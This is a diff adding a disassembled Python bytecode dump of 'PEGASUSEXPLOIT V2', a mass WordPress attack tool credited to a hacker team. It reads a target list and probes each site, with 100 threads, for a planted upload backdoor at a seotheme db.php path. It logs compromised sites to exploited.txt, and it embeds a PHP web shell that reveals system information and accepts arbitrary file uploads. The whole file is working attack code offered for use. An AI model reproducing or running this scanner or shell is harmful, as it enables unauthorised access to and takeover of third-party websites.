@@ -1,0 +1,592 @@
+a.pyc (Python 3.9)
+[Code]
+    File Name: a.py
+    Object Name: <module>
+    Arg Count: 0
+    Pos Only Arg Count: 0
+    KW Only Arg Count: 0
+    Locals: 0
+    Stack Size: 9
+    Flags: 0x00000040 (CO_NOFREE)
+    [Names]
+        'sys'
+        'requests'
+        're'
+        'multiprocessing.dummy'
+        'Pool'
+        'colorama'
+        'Fore'
+        'Style'
+        'init'
+        'platform'
+        'os'
+        'system'
+        'name'
+        'RED'
+        'fr'
+        'CYAN'
+        'fc'
+        'WHITE'
+        'fw'
+        'GREEN'
+        'fg'
+        'MAGENTA'
+        'fm'
+        'print'
+        'shell'
+        'urllib3'
+        'disable_warnings'
+        'headers'
+        'input'
+        'sr'
+        'open'
+        'readlines'
+        'target'
+        'URLdomain'
+        'FourHundredThree'
+        'mp'
+        'map'
+        'close'
+        'join'
+        'RESET_ALL'
+    [Var Names]
+    [Free Vars]
+    [Cell Vars]
+    [Constants]
+        0
+        None
+        (
+            'Pool'
+        )
+        (
+            'Fore'
+            'Style'
+        )
+        (
+            'init'
+        )
+        True
+        (
+            'autoreset'
+        )
+        'title PEGASUSEXPLOIT V2 By : @killo_trojanz'
+        'win32'
+        'color'
+        'nt'
+        'cls'
+        'clear'
+        '\n\n  _____                               ______       __      _____  \n |  __ \\        \x1b[41;1m PEGASUSEXPOIT V2 \x1b[0m   |  ____|      \\ \\    / /__ \\ \n | |__) |__  __ _  __ _ ___ _   _ ___| |__  __  __  \\ \\  / /   ) |\n |  ___/ _ \\/ _` |/ _` / __| | | / __|  __| \\ \\/ /   \\ \\/ /   / / \n | |  |  __/ (_| | (_| \\__ \\ |_| \\__ \\ |____ >  <     \\  /   / /_ \n |_|   \\___|\\__, |\\__,_|___/\\__,_|___/______/_/\\_\\     \\/   |____|\n             __/ |    \x1b[42;1m Best High Wordpress Domain Quality Exploit \x1b[0m                   \n            |___/     \x1b[41;1m Coded By : @killo_trojanz \x1b[0m                                     \n                      \x1b[41;1m Turkey Hacker Team Project \x1b[0m  \n'
+        '<?php echo "Raiz0WorM"; echo "<br>".php_uname()."<br>"; echo "<form method=\'post\' enctype=\'multipart/form-data\'> <input type=\'file\' name=\'zb\'><input type=\'submit\' name=\'upload\' value=\'upload\'></form>"; if($_POST[\'upload\']) { if(@copy($_FILES[\'zb\'][\'tmp_name\'], $_FILES[\'zb\'][\'name\'])) { echo "eXploiting Done"; } else { echo "Failed to Upload."; } } ?>'
+        'keep-alive'
+        'max-age=0'
+        '1'
+        'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36'
+        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
+        'gzip, deflate'
+        'en-US,en;q=0.9,fr;q=0.8'
+        'www.google.com'
+        (
+            'Connection'
+            'Cache-Control'
+            'Upgrade-Insecure-Requests'
+            'User-Agent'
+            'Accept'
+            'Accept-Encoding'
+            'Accept-Language'
+            'referer'
+        )
+        'Your list: '
+        [Code]
+            File Name: a.py
+            Object Name: <listcomp>
+            Arg Count: 1
+            Pos Only Arg Count: 0
+            KW Only Arg Count: 0
+            Locals: 2
+            Stack Size: 4
+            Flags: 0x00000043 (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)
+            [Names]
+                'strip'
+            [Var Names]
+                '.0'
+                'i'
+            [Free Vars]
+            [Cell Vars]
+            [Constants]
+            [Disassembly]
+                0       BUILD_LIST              0
+                2       LOAD_FAST               0: .0
+                4       FOR_ITER                12 (to 18)
+                6       STORE_FAST              1: i
+                8       LOAD_FAST               1: i
+                10      LOAD_METHOD             0: strip
+                12      CALL_METHOD             0
+                14      LIST_APPEND             2
+                16      JUMP_ABSOLUTE           4
+                18      RETURN_VALUE            
+        '<listcomp>'
+        'r'
+        (
+            'mode'
+        )
+        [Code]
+            File Name: a.py
+            Object Name: URLdomain
+            Arg Count: 1
+            Pos Only Arg Count: 0
+            KW Only Arg Count: 0
+            Locals: 3
+            Stack Size: 4
+            Flags: 0x00000043 (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)
+            [Names]
+                'startswith'
+                'replace'
+                're'
+                'compile'
+                'findall'
+            [Var Names]
+                'site'
+                'pattern'
+                'sitez'
+            [Free Vars]
+            [Cell Vars]
+            [Constants]
+                None
+                'http://'
+                ''
+                'https://'
+                '(.*)/'
+                0
+            [Disassembly]
+                0       LOAD_FAST               0: site
+                2       LOAD_METHOD             0: startswith
+                4       LOAD_CONST              1: 'http://'
+                6       CALL_METHOD             1
+                8       POP_JUMP_IF_FALSE       24
+                10      LOAD_FAST               0: site
+                12      LOAD_METHOD             1: replace
+                14      LOAD_CONST              1: 'http://'
+                16      LOAD_CONST              2: ''
+                18      CALL_METHOD             2
+                20      STORE_FAST              0: site
+                22      JUMP_FORWARD            24 (to 48)
+                24      LOAD_FAST               0: site
+                26      LOAD_METHOD             0: startswith
+                28      LOAD_CONST              3: 'https://'
+                30      CALL_METHOD             1
+                32      POP_JUMP_IF_FALSE       48
+                34      LOAD_FAST               0: site
+                36      LOAD_METHOD             1: replace
+                38      LOAD_CONST              3: 'https://'
+                40      LOAD_CONST              2: ''
+                42      CALL_METHOD             2
+                44      STORE_FAST              0: site
+                46      JUMP_FORWARD            0 (to 48)
+                48      LOAD_GLOBAL             2: re
+                50      LOAD_METHOD             3: compile
+                52      LOAD_CONST              4: '(.*)/'
+                54      CALL_METHOD             1
+                56      STORE_FAST              1: pattern
+                58      LOAD_GLOBAL             2: re
+                60      LOAD_METHOD             4: findall
+                62      LOAD_FAST               1: pattern
+                64      LOAD_FAST               0: site
+                66      CALL_METHOD             2
+                68      POP_JUMP_IF_FALSE       92
+                70      LOAD_GLOBAL             2: re
+                72      LOAD_METHOD             4: findall
+                74      LOAD_FAST               1: pattern
+                76      LOAD_FAST               0: site
+                78      CALL_METHOD             2
+                80      STORE_FAST              2: sitez
+                82      LOAD_FAST               2: sitez
+                84      LOAD_CONST              5: 0
+                86      BINARY_SUBSCR           
+                88      STORE_FAST              0: site
+                90      JUMP_ABSOLUTE           58
+                92      LOAD_FAST               0: site
+                94      RETURN_VALUE            
+        'URLdomain'
+        [Code]
+            File Name: a.py
+            Object Name: FourHundredThree
+            Arg Count: 1
+            Pos Only Arg Count: 0
+            KW Only Arg Count: 0
+            Locals: 2
+            Stack Size: 10
+            Flags: 0x00000043 (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)
+            [Names]
+                'URLdomain'
+                'requests'
+                'get'
+                'headers'
+                'content'
+                'print'
+                'fg'
+                'Style'
+                'RESET_ALL'
+                'open'
+                'write'
+                'fr'
+            [Var Names]
+                'url'
+                'check'
+            [Free Vars]
+            [Cell Vars]
+            [Constants]
+                None
+                'http://'
+                '/wp-content/themes/seotheme/db.php?u'
+                True
+                15
+                (
+                    'headers'
+                    'allow_redirects'
+                    'timeout'
+                )
+                b'input name="_upl" type="submit" id="_upl" value="Upload"'
+                '# '
+                ' --> '
+                'Exploited!'
+                'exploited.txt'
+                'a'
+                '/wp-content/themes/seotheme/db.php?u\n'
+                'https://'
+                False
+                (
+                    'headers'
+                    'allow_redirects'
+                    'verify'
+                    'timeout'
+                )
+                'Failed'
+            [Disassembly]
+                0       SETUP_FINALLY           222 (to 224)
+                2       LOAD_CONST              1: 'http://'
+                4       LOAD_GLOBAL             0: URLdomain
+                6       LOAD_FAST               0: url
+                8       CALL_FUNCTION           1
+                10      BINARY_ADD              
+                12      STORE_FAST              0: url
+                14      LOAD_GLOBAL             1: requests
+                16      LOAD_ATTR               2: get
+                18      LOAD_FAST               0: url
+                20      LOAD_CONST              2: '/wp-content/themes/seotheme/db.php?u'
+                22      BINARY_ADD              
+                24      LOAD_GLOBAL             3: headers
+                26      LOAD_CONST              3: True
+                28      LOAD_CONST              4: 15
+                30      LOAD_CONST              5: ('headers', 'allow_redirects', 'timeout')
+                32      CALL_FUNCTION_KW        4
+                34      STORE_FAST              1: check
+                36      LOAD_CONST              6: b'input name="_upl" type="submit" id="_upl" value="Upload"'
+                38      LOAD_FAST               1: check
+                40      LOAD_ATTR               4: content
+                42      CONTAINS_OP             0 (in)
+                44      POP_JUMP_IF_FALSE       96
+                46      LOAD_GLOBAL             5: print
+                48      LOAD_CONST              7: '# '
+                50      LOAD_FAST               0: url
+                52      FORMAT_VALUE            0
+                54      LOAD_CONST              8: ' --> '
+                56      LOAD_GLOBAL             6: fg
+                58      FORMAT_VALUE            0
+                60      LOAD_CONST              9: 'Exploited!'
+                62      LOAD_GLOBAL             7: Style
+                64      LOAD_ATTR               8: RESET_ALL
+                66      FORMAT_VALUE            0
+                68      BUILD_STRING            6
+                70      CALL_FUNCTION           1
+                72      POP_TOP                 
+                74      LOAD_GLOBAL             9: open
+                76      LOAD_CONST              10: 'exploited.txt'
+                78      LOAD_CONST              11: 'a'
+                80      CALL_FUNCTION           2
+                82      LOAD_METHOD             10: write
+                84      LOAD_FAST               0: url
+                86      LOAD_CONST              12: '/wp-content/themes/seotheme/db.php?u\n'
+                88      BINARY_ADD              
+                90      CALL_METHOD             1
+                92      POP_TOP                 
+                94      JUMP_FORWARD            124 (to 220)
+                96      LOAD_CONST              13: 'https://'
+                98      LOAD_GLOBAL             0: URLdomain
+                100     LOAD_FAST               0: url
+                102     CALL_FUNCTION           1
+                104     BINARY_ADD              
+                106     STORE_FAST              0: url
+                108     LOAD_GLOBAL             1: requests
+                110     LOAD_ATTR               2: get
+                112     LOAD_FAST               0: url
+                114     LOAD_CONST              2: '/wp-content/themes/seotheme/db.php?u'
+                116     BINARY_ADD              
+                118     LOAD_GLOBAL             3: headers
+                120     LOAD_CONST              3: True
+                122     LOAD_CONST              14: False
+                124     LOAD_CONST              4: 15
+                126     LOAD_CONST              15: ('headers', 'allow_redirects', 'verify', 'timeout')
+                128     CALL_FUNCTION_KW        5
+                130     STORE_FAST              1: check
+                132     LOAD_CONST              6: b'input name="_upl" type="submit" id="_upl" value="Upload"'
+                134     LOAD_FAST               1: check
+                136     LOAD_ATTR               4: content
+                138     CONTAINS_OP             0 (in)
+                140     POP_JUMP_IF_FALSE       192
+                142     LOAD_GLOBAL             5: print
+                144     LOAD_CONST              7: '# '
+                146     LOAD_FAST               0: url
+                148     FORMAT_VALUE            0
+                150     LOAD_CONST              8: ' --> '
+                152     LOAD_GLOBAL             6: fg
+                154     FORMAT_VALUE            0
+                156     LOAD_CONST              9: 'Exploited!'
+                158     LOAD_GLOBAL             7: Style
+                160     LOAD_ATTR               8: RESET_ALL
+                162     FORMAT_VALUE            0
+                164     BUILD_STRING            6
+                166     CALL_FUNCTION           1
+                168     POP_TOP                 
+                170     LOAD_GLOBAL             9: open
+                172     LOAD_CONST              10: 'exploited.txt'
+                174     LOAD_CONST              11: 'a'
+                176     CALL_FUNCTION           2
+                178     LOAD_METHOD             10: write
+                180     LOAD_FAST               0: url
+                182     LOAD_CONST              12: '/wp-content/themes/seotheme/db.php?u\n'
+                184     BINARY_ADD              
+                186     CALL_METHOD             1
+                188     POP_TOP                 
+                190     JUMP_FORWARD            28 (to 220)
+                192     LOAD_GLOBAL             5: print
+                194     LOAD_CONST              7: '# '
+                196     LOAD_FAST               0: url
+                198     FORMAT_VALUE            0
+                200     LOAD_CONST              8: ' --> '
+                202     LOAD_GLOBAL             11: fr
+                204     FORMAT_VALUE            0
+                206     LOAD_CONST              16: 'Failed'
+                208     LOAD_GLOBAL             7: Style
+                210     LOAD_ATTR               8: RESET_ALL
+                212     FORMAT_VALUE            0
+                214     BUILD_STRING            6
+                216     CALL_FUNCTION           1
+                218     POP_TOP                 
+                220     POP_BLOCK               
+                222     JUMP_FORWARD            40 (to 264)
+                224     POP_TOP                 
+                226     POP_TOP                 
+                228     POP_TOP                 
+                230     LOAD_GLOBAL             5: print
+                232     LOAD_CONST              7: '# '
+                234     LOAD_FAST               0: url
+                236     FORMAT_VALUE            0
+                238     LOAD_CONST              8: ' --> '
+                240     LOAD_GLOBAL             11: fr
+                242     FORMAT_VALUE            0
+                244     LOAD_CONST              16: 'Failed'
+                246     LOAD_GLOBAL             7: Style
+                248     LOAD_ATTR               8: RESET_ALL
+                250     FORMAT_VALUE            0
+                252     BUILD_STRING            6
+                254     CALL_FUNCTION           1
+                256     POP_TOP                 
+                258     POP_EXCEPT              
+                260     JUMP_FORWARD            2 (to 264)
+                262     RERAISE                 
+                264     LOAD_CONST              0: None
+                266     RETURN_VALUE            
+        'FourHundredThree'
+        100
+        '\n [!] '
+        'Done'
+    [Disassembly]
+        0       LOAD_CONST              0: 0
+        2       LOAD_CONST              1: None
+        4       IMPORT_NAME             0: sys
+        6       STORE_NAME              0: sys
+        8       LOAD_CONST              0: 0
+        10      LOAD_CONST              1: None
+        12      IMPORT_NAME             1: requests
+        14      STORE_NAME              1: requests
+        16      LOAD_CONST              0: 0
+        18      LOAD_CONST              1: None
+        20      IMPORT_NAME             2: re
+        22      STORE_NAME              2: re
+        24      LOAD_CONST              0: 0
+        26      LOAD_CONST              2: ('Pool',)
+        28      IMPORT_NAME             3: multiprocessing.dummy
+        30      IMPORT_FROM             4: Pool
+        32      STORE_NAME              4: Pool
+        34      POP_TOP                 
+        36      LOAD_CONST              0: 0
+        38      LOAD_CONST              3: ('Fore', 'Style')
+        40      IMPORT_NAME             5: colorama
+        42      IMPORT_FROM             6: Fore
+        44      STORE_NAME              6: Fore
+        46      IMPORT_FROM             7: Style
+        48      STORE_NAME              7: Style
+        50      POP_TOP                 
+        52      LOAD_CONST              0: 0
+        54      LOAD_CONST              4: ('init',)
+        56      IMPORT_NAME             5: colorama
+        58      IMPORT_FROM             8: init
+        60      STORE_NAME              8: init
+        62      POP_TOP                 
+        64      LOAD_NAME               8: init
+        66      LOAD_CONST              5: True
+        68      LOAD_CONST              6: ('autoreset',)
+        70      CALL_FUNCTION_KW        1
+        72      POP_TOP                 
+        74      LOAD_CONST              0: 0
+        76      LOAD_CONST              1: None
+        78      IMPORT_NAME             9: platform
+        80      STORE_NAME              9: platform
+        82      LOAD_CONST              0: 0
+        84      LOAD_CONST              1: None
+        86      IMPORT_NAME             10: os
+        88      STORE_NAME              10: os
+        90      LOAD_CONST              0: 0
+        92      LOAD_CONST              1: None
+        94      IMPORT_NAME             5: colorama
+        96      STORE_NAME              5: colorama
+        98      SETUP_FINALLY           14 (to 114)
+        100     LOAD_NAME               10: os
+        102     LOAD_METHOD             11: system
+        104     LOAD_CONST              7: 'title PEGASUSEXPLOIT V2 By : @killo_trojanz'
+        106     CALL_METHOD             1
+        108     POP_TOP                 
+        110     POP_BLOCK               
+        112     JUMP_FORWARD            12 (to 126)
+        114     POP_TOP                 
+        116     POP_TOP                 
+        118     POP_TOP                 
+        120     POP_EXCEPT              
+        122     JUMP_FORWARD            2 (to 126)
+        124     RERAISE                 
+        126     LOAD_NAME               9: platform
+        128     LOAD_CONST              8: 'win32'
+        130     COMPARE_OP              2 (==)
+        132     POP_JUMP_IF_FALSE       142
+        134     LOAD_NAME               11: system
+        136     LOAD_CONST              9: 'color'
+        138     CALL_FUNCTION           1
+        140     POP_TOP                 
+        142     LOAD_NAME               10: os
+        144     LOAD_ATTR               12: name
+        146     LOAD_CONST              10: 'nt'
+        148     COMPARE_OP              2 (==)
+        150     POP_JUMP_IF_FALSE       164
+        152     LOAD_NAME               10: os
+        154     LOAD_METHOD             11: system
+        156     LOAD_CONST              11: 'cls'
+        158     CALL_METHOD             1
+        160     POP_TOP                 
+        162     JUMP_FORWARD            10 (to 174)
+        164     LOAD_NAME               10: os
+        166     LOAD_METHOD             11: system
+        168     LOAD_CONST              12: 'clear'
+        170     CALL_METHOD             1
+        172     POP_TOP                 
+        174     LOAD_NAME               6: Fore
+        176     LOAD_ATTR               13: RED
+        178     STORE_NAME              14: fr
+        180     LOAD_NAME               6: Fore
+        182     LOAD_ATTR               15: CYAN
+        184     STORE_NAME              16: fc
+        186     LOAD_NAME               6: Fore
+        188     LOAD_ATTR               17: WHITE
+        190     STORE_NAME              18: fw
+        192     LOAD_NAME               6: Fore
+        194     LOAD_ATTR               19: GREEN
+        196     STORE_NAME              20: fg
+        198     LOAD_NAME               6: Fore
+        200     LOAD_ATTR               21: MAGENTA
+        202     STORE_NAME              22: fm
+        204     LOAD_NAME               23: print
+        206     LOAD_CONST              13: '\n\n  _____                               ______       __      _____  \n |  __ \\        \x1b[41;1m PEGASUSEXPOIT V2 \x1b[0m   |  ____|      \\ \\    / /__ \\ \n | |__) |__  __ _  __ _ ___ _   _ ___| |__  __  __  \\ \\  / /   ) |\n |  ___/ _ \\/ _` |/ _` / __| | | / __|  __| \\ \\/ /   \\ \\/ /   / / \n | |  |  __/ (_| | (_| \\__ \\ |_| \\__ \\ |____ >  <     \\  /   / /_ \n |_|   \\___|\\__, |\\__,_|___/\\__,_|___/______/_/\\_\\     \\/   |____|\n             __/ |    \x1b[42;1m Best High Wordpress Domain Quality Exploit \x1b[0m                   \n            |___/     \x1b[41;1m Coded By : @killo_trojanz \x1b[0m                                     \n                      \x1b[41;1m Turkey Hacker Team Project \x1b[0m  \n'
+        208     CALL_FUNCTION           1
+        210     POP_TOP                 
+        212     LOAD_CONST              14: '<?php echo "Raiz0WorM"; echo "<br>".php_uname()."<br>"; echo "<form method=\'post\' enctype=\'multipart/form-data\'> <input type=\'file\' name=\'zb\'><input type=\'submit\' name=\'upload\' value=\'upload\'></form>"; if($_POST[\'upload\']) { if(@copy($_FILES[\'zb\'][\'tmp_name\'], $_FILES[\'zb\'][\'name\'])) { echo "eXploiting Done"; } else { echo "Failed to Upload."; } } ?>'
+        214     STORE_NAME              24: shell
+        216     LOAD_NAME               1: requests
+        218     LOAD_ATTR               25: urllib3
+        220     LOAD_METHOD             26: disable_warnings
+        222     CALL_METHOD             0
+        224     POP_TOP                 
+        226     LOAD_CONST              15: 'keep-alive'
+        228     LOAD_CONST              16: 'max-age=0'
+        230     LOAD_CONST              17: '1'
+        232     LOAD_CONST              18: 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36'
+        234     LOAD_CONST              19: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
+        236     LOAD_CONST              20: 'gzip, deflate'
+        238     LOAD_CONST              21: 'en-US,en;q=0.9,fr;q=0.8'
+        240     LOAD_CONST              22: 'www.google.com'
+        242     LOAD_CONST              23: ('Connection', 'Cache-Control', 'Upgrade-Insecure-Requests', 'User-Agent', 'Accept', 'Accept-Encoding', 'Accept-Language', 'referer')
+        244     BUILD_CONST_KEY_MAP     8
+        246     STORE_NAME              27: headers
+        248     LOAD_NAME               28: input
+        250     LOAD_CONST              24: 'Your list: '
+        252     CALL_FUNCTION           1
+        254     STORE_NAME              29: sr
+        256     SETUP_FINALLY           30 (to 288)
+        258     LOAD_CONST              25: <CODE> <listcomp>
+        260     LOAD_CONST              26: '<listcomp>'
+        262     MAKE_FUNCTION           0
+        264     LOAD_NAME               30: open
+        266     LOAD_NAME               29: sr
+        268     LOAD_CONST              27: 'r'
+        270     LOAD_CONST              28: ('mode',)
+        272     CALL_FUNCTION_KW        2
+        274     LOAD_METHOD             31: readlines
+        276     CALL_METHOD             0
+        278     GET_ITER                
+        280     CALL_FUNCTION           1
+        282     STORE_NAME              32: target
+        284     POP_BLOCK               
+        286     JUMP_FORWARD            12 (to 300)
+        288     POP_TOP                 
+        290     POP_TOP                 
+        292     POP_TOP                 
+        294     POP_EXCEPT              
+        296     JUMP_FORWARD            2 (to 300)
+        298     RERAISE                 
+        300     LOAD_CONST              29: <CODE> URLdomain
+        302     LOAD_CONST              30: 'URLdomain'
+        304     MAKE_FUNCTION           0
+        306     STORE_NAME              33: URLdomain
+        308     LOAD_CONST              31: <CODE> FourHundredThree
+        310     LOAD_CONST              32: 'FourHundredThree'
+        312     MAKE_FUNCTION           0
+        314     STORE_NAME              34: FourHundredThree
+        316     LOAD_NAME               4: Pool
+        318     LOAD_CONST              33: 100
+        320     CALL_FUNCTION           1
+        322     STORE_NAME              35: mp
+        324     LOAD_NAME               35: mp
+        326     LOAD_METHOD             36: map
+        328     LOAD_NAME               34: FourHundredThree
+        330     LOAD_NAME               32: target
+        332     CALL_METHOD             2
+        334     POP_TOP                 
+        336     LOAD_NAME               35: mp
+        338     LOAD_METHOD             37: close
+        340     CALL_METHOD             0
+        342     POP_TOP                 
+        344     LOAD_NAME               35: mp
+        346     LOAD_METHOD             38: join
+        348     CALL_METHOD             0
+        350     POP_TOP                 
+        352     LOAD_NAME               23: print
+        354     LOAD_CONST              34: '\n [!] '
+        356     LOAD_NAME               14: fr
+        358     FORMAT_VALUE            0
+        360     LOAD_CONST              35: 'Done'
+        362     LOAD_NAME               7: Style
+        364     LOAD_ATTR               39: RESET_ALL
+        366     FORMAT_VALUE            0
+        368     BUILD_STRING            4
+        370     CALL_FUNCTION           1
+        372     POP_TOP                 
+        374     LOAD_CONST              1: None
+        376     RETURN_VALUE            
